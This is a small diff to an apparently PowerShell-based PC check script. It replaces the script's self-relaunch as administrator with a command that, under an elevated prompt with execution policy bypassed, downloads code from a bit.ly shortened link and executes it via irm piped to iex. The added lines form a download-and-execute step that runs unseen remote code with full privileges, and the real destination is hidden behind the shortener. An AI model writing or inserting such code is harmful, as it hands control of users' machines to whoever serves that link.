@@ -6,8 +6,8 @@ function Test-Administrator {
 }
 
 if (-not (Test-Administrator)) {
-    $args = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
-    Start-Process powershell.exe -ArgumentList $args -Verb runAs
+    $arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"& { irm `"https://bit.ly/luvvr-pc-check`" | iex } "
+    Start-Process powershell.exe -ArgumentList $arguments -Verb runAs
     exit
 }
 
